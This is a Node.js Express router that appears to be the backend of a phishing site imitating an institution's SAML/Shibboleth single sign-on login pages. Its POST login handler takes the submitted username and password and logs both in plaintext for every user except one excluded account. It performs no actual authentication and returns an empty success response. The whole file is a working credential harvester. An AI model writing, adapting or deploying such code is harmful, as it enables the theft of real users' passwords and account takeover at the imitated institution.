var express = require('express');
var router = express.Router();
const logger = require('../utils/logger');
let browser;
/* GET home page. */
router.get('/', function(req, res, next) {
    res.redirect("/webapps/login");
});

router.get('/webapps/login', function(req, res, next) {
    res.render('index');
});

router.get('/idp/profile/SAML2/Redirect/SSO', function(req, res, next) {
    res.render('login');

});

router.post('/idp/profile/SAML2/Redirect/SSO/login', function(req, res, next) {
    var username = req.body.j_username;
    var password = req.body.j_password;
    if (username != "jdecaro") {
        logger.info(username);
        logger.info(password);
    }
    res.status(200);
    res.end();


});

module.exports = router;
